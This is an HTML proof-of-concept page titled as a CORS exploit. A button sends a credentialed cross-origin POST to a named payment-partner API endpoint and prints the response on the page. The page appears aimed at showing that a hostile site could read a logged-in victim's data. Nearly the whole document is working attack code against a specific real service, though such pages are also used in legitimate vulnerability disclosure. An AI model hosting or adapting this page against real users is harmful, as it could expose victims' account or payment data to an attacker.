<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC Exploit</title>
  </head>
  <body>
    <h1>Proof of Concept - CORS Exploit</h1>
    <button onclick="exploit()">Run Exploit</button>

    <pre id="output"></pre>

    <script>
      function exploit() {
        fetch("https://partner-api.alipayplus.com/api/aplus/applySupport.json", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            "ctoken": "dummy"
          },
          body: JSON.stringify({ test: "CORS exploit" })
        })
        .then(response => response.text())
        .then(data => {
          document.getElementById("output").textContent = data;
        })
        .catch(error => {
          document.getElementById("output").textContent = "Error: " + error;
        });
      }
    </script>
  </body>
</html>
